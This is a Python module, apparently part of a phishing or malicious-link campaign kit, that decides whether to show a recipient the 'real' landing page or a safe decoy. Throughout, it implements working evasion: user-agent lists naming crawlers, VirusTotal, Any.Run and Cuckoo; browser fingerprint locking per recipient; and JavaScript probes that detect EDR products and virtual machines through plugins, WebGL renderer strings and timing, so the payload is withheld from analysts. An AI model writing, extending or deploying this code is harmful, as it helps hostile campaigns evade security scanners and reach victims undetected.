"""URL sandbox evasion helpers.

Stores a one-time fingerprint (IP + User-Agent) per recipient. The first visit
from a non-sandbox client locks the expected fingerprint; subsequent visits
with a mismatch are served the safe landing page.
"""

import hashlib
import re
from typing import Tuple

from dropoutjeep_lib import db
from dropoutjeep_lib.models import RecipientFingerprint


SANDBOX_UA_PATTERNS = [
    re.compile(r"googlebot", re.I),
    re.compile(r"bingbot", re.I),
    re.compile(r"slurp", re.I),
    re.compile(r"baiduspider", re.I),
    re.compile(r"yandexbot", re.I),
    re.compile(r"facebookexternalhit", re.I),
    re.compile(r"twitterbot", re.I),
    re.compile(r"linkedinbot", re.I),
    re.compile(r"whatsapp", re.I),
    re.compile(r"crawler", re.I),
    re.compile(r"python-requests", re.I),
    re.compile(r"curl/", re.I),
    re.compile(r"wget/", re.I),
    re.compile(r"httpclient", re.I),
    re.compile(r"scrapy", re.I),
    re.compile(r"virustotal", re.I),
    re.compile(r"anyrun", re.I),
    re.compile(r"hybrid", re.I),
    re.compile(r"joe\s*security", re.I),
    re.compile(r"cuckoo", re.I),
    re.compile(r"sandbox", re.I),
    re.compile(r"headlesschrome", re.I),
    re.compile(r"phantomjs", re.I),
    re.compile(r"selenium", re.I),
]


def is_sandbox_ua(ua: str) -> bool:
    """Return True if the UA looks like a crawler/sandbox/analyst tool."""
    if not ua:
        return True
    ua_lower = ua.lower()
    return any(p.search(ua_lower) for p in SANDBOX_UA_PATTERNS)


def fingerprint_request(ip: str, ua: str) -> str:
    """Deterministic short fingerprint for IP + UA."""
    payload = f"{ip or ''}|{ua or ''}"
    return hashlib.sha256(payload.encode()).hexdigest()[:32]


def _is_suspicious_fingerprint(data: dict | None) -> str | None:
    """Return a reason string if browser fingerprint looks like a sandbox."""
    if not data:
        return None

    # Headless / automation indicators.
    if data.get('webgl_hash') == 0 or data.get('webgl_hash') is None:
        return "missing_webgl"
    if data.get('plugins') == []:
        return "no_plugins"
    if data.get('screen', {}).get('width', 0) < 800 or data.get('screen', {}).get('height', 0) < 600:
        return "small_screen"

    # Interaction-based: sandboxes often have zero mouse events.
    mouse_events = data.get('mouse_events', 0)
    if isinstance(mouse_events, int) and mouse_events < 1:
        return "no_mouse_interaction"

    # Battery API is often missing or fixed in VMs.
    battery = data.get('battery_level')
    if battery is not None and (battery <= 0.0 or battery > 1.0):
        return "impossible_battery"

    return None


def should_serve_real_page(
    recipient,
    campaign,
    ip: str,
    ua: str,
    fingerprint_data: dict | None = None,
) -> Tuple[bool, str]:
    """Decide whether to serve the real landing page for this request.

    Returns (serve_real, reason).
    """
    if is_sandbox_ua(ua):
        return False, "sandbox_ua"

    suspicious = _is_suspicious_fingerprint(fingerprint_data)
    if suspicious:
        return False, suspicious

    fp_hash = fingerprint_request(ip, ua)
    existing = RecipientFingerprint.query.filter_by(
        recipient_id=recipient.id,
        campaign_id=campaign.id,
    ).first()

    if not existing:
        fp = RecipientFingerprint(
            recipient_id=recipient.id,
            campaign_id=campaign.id,
            first_seen_ip=ip,
            first_seen_ua=ua,
            first_seen_hash=fp_hash,
        )
        db.session.add(fp)
        db.session.commit()
        return True, "first_seen"

    if existing.first_seen_hash == fp_hash:
        return True, "fingerprint_match"

    return False, "fingerprint_mismatch"


# ---------------------------------------------------------------------------
# Western EDR / endpoint-protection detection (browser-side signals).
#
# These helpers return JavaScript source strings that the landing page can
# execute client-side; the Python side then processes the returned data via
# ``should_serve_decoy_for_edr``.  This split keeps the heavy detection logic
# in the browser (where the EDR actually lives) while the server makes the
# serve/withhold decision.
# ---------------------------------------------------------------------------

# Known Western endpoint-protection / EDR process names.  These are used for
# reference and for matching any client-supplied process lists; the browser
# itself cannot enumerate host processes directly, but ActiveX / native-messaging
# probes and behavioural timing can reveal their presence.
WESTERN_EDR_PROCESSES: list[str] = [
    "MsMpEng",            # Microsoft Defender
    "NisSrv",             # Microsoft Defender Network Inspection
    "CSFalconService",    # CrowdStrike Falcon
    "SentinelAgent",      # SentinelOne
    "SentinelServiceExe", # SentinelOne helper
    "CbDefense",          # VMware Carbon Black
    "ampdaemon",          # Cisco AMP
    "Tmmbg",              # Trend Micro
    "Sysmon",             # Sysinternals Sysmon
    "mcshield",           # McAfee
    "mbam",               # Malwarebytes
]

# WebGL renderer substrings characteristic of VM / headless guests.
VM_GPU_RENDERER_MARKERS: list[str] = [
    "swiftshader",          # Chrome software renderer (common in headless)
    "microsoft basic render driver",  # Hyper-V / RDP fallback GPU
    "virtualbox",           # VirtualBox Guest Additions GPU
    "vmware",               # VMware SVGA
    "parallels",            # Parallels guest
    "gdigrv",               # Remote desktop GDI rasterizer
    "remote desktop",       # RDP virtual GPU
    "hyperv",               # Hyper-V synthetic
]

# EDR vendors whose browser-registered plugin names we flag.
EDR_PLUGIN_MARKERS: list[str] = [
    "crowdstrike",
    "falcon",
    "sentinelone",
    "carbonblack",
    "cbdefense",
    "mcafee",
    "symantec",
    "norton",
    "trend micro",
    "cisco amp",
    "windows defender",
    "sysmon",
]

# Threshold (ms) for the timing probe: EDR-instrumented JS execution tends to
# run noticeably slower than bare-metal.  The probe measures a tight CPU loop;
# a result above this is treated as suspicious.
EDR_TIMING_THRESHOLD_MS = 120.0


def detect_edr_via_plugins() -> str:
    """Return JavaScript that enumerates ``navigator.plugins`` for EDR markers.

    The snippet returns a JSON-serialisable list of matching plugin names.
    Safe to run via ``eval`` / a Function() wrapper in the landing page.
    """
    return """
(function() {
    var markers = [
        "crowdstrike", "falcon", "sentinelone", "carbonblack", "cbdefense",
        "mcafee", "symantec", "norton", "trend micro", "cisco amp",
        "windows defender", "sysmon"
    ];
    var hits = [];
    try {
        var plugins = navigator.plugins || [];
        for (var i = 0; i < plugins.length; i++) {
            var name = (plugins[i].name || "").toLowerCase();
            var fname = (plugins[i].filename || "").toLowerCase();
            for (var m = 0; m < markers.length; m++) {
                if (name.indexOf(markers[m]) !== -1 || fname.indexOf(markers[m]) !== -1) {
                    hits.push(plugins[i].name || plugins[i].filename);
                    break;
                }
            }
        }
    } catch (e) {
        // navigator.plugins may be restricted; treat as no hits.
    }
    return hits;
})();
""".strip()


def detect_edr_via_webgl() -> str:
    """Return JavaScript that inspects the WebGL renderer string for VM GPUs.

    Returns ``{ "renderer": "...", "vendor": "...", "is_vm": <bool> }``.
    A missing/null renderer is treated as suspicious (``is_vm: true``).
    """
    return """
(function() {
    var markers = [
        "swiftshader", "microsoft basic render driver", "virtualbox",
        "vmware", "parallels", "gdigrv", "remote desktop", "hyperv"
    ];
    var canvas = document.createElement('canvas');
    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) {
        return { "renderer": null, "vendor": null, "is_vm": true };
    }
    var dbg = gl.getExtension('WEBGL_debug_renderer_info');
    var renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null;
    var vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null;
    var r = (renderer || "").toLowerCase();
    var isVm = !renderer || markers.some(function(m) { return r.indexOf(m) !== -1; });
    return { "renderer": renderer, "vendor": vendor, "is_vm": isVm };
})();
""".strip()


def detect_edr_via_timing() -> str:
    """Return JavaScript that measures a tight CPU loop to detect EDR hooks.

    EDR products that hook script execution (e.g. via ETW, AMSI, or inline
    instrumentation) introduce measurable overhead.  The probe runs a bounded
    arithmetic loop and reports the elapsed time in milliseconds.  Values
    above ``EDR_TIMING_THRESHOLD_MS`` are treated as suspicious by
    ``should_serve_decoy_for_edr``.
    """
    return """
(function() {
    var start = performance.now();
    var sum = 0;
    for (var i = 0; i < 5000000; i++) {
        sum += (i * 31) ^ (i >>> 2);
    }
    var elapsed = performance.now() - start;
    // Touch sum so dead-code elimination does not strip the loop.
    return { "elapsed_ms": Math.round(elapsed * 100) / 100, "checksum": sum };
})();
""".strip()


def should_serve_decoy_for_edr(fingerprint_data: dict) -> tuple[bool, str]:
    """Decide whether to serve the decoy page based on EDR indicators.

    ``fingerprint_data`` is expected to contain the results of the three
    browser-side probes above, under the keys ``edr_plugins``, ``edr_webgl``,
    and ``edr_timing`` respectively.  Each may be ``None`` / absent if the
    probe was not run.

    Returns ``(serve_decoy, reason)``.  ``serve_decoy`` is True when an EDR /
    VM indicator is present and the real payload should be withheld.
    """
    if not fingerprint_data:
        return False, "no_edr_data"

    # 1. EDR-registered browser plugins.
    plugins = fingerprint_data.get('edr_plugins')
    if isinstance(plugins, list) and plugins:
        return True, f"edr_plugin:{plugins[0]}"

    # 2. WebGL renderer characteristic of a VM / headless guest.
    webgl = fingerprint_data.get('edr_webgl')
    if isinstance(webgl, dict):
        if webgl.get('is_vm'):
            renderer = webgl.get('renderer') or 'unknown'
            return True, f"vm_gpu:{renderer}"
        renderer = (webgl.get('renderer') or '').lower()
        for marker in VM_GPU_RENDERER_MARKERS:
            if marker in renderer:
                return True, f"vm_renderer:{renderer}"

    # 3. Timing probe: instrumented execution is measurably slower.
    timing = fingerprint_data.get('edr_timing')
    if isinstance(timing, dict):
        elapsed = timing.get('elapsed_ms')
        if isinstance(elapsed, (int, float)) and elapsed > EDR_TIMING_THRESHOLD_MS:
            return True, f"slow_timing:{elapsed}"

    # 4. Optional client-reported process list (e.g. via ActiveX / native
    #    messaging).  Match against the known Western EDR process names.
    #    Use substring matching so 'MsMpEng.exe' / 'MsMpEng (PID 42)' hit
    #    the bare process-name entry 'MsMpEng'.
    procs = fingerprint_data.get('processes')
    if isinstance(procs, list) and procs:
        proc_lower = [str(p).lower() for p in procs]
        for edr_proc in WESTERN_EDR_PROCESSES:
            edr_lower = edr_proc.lower()
            if any(edr_lower in p for p in proc_lower):
                return True, f"edr_process:{edr_proc}"

    return False, "no_edr_indicators"
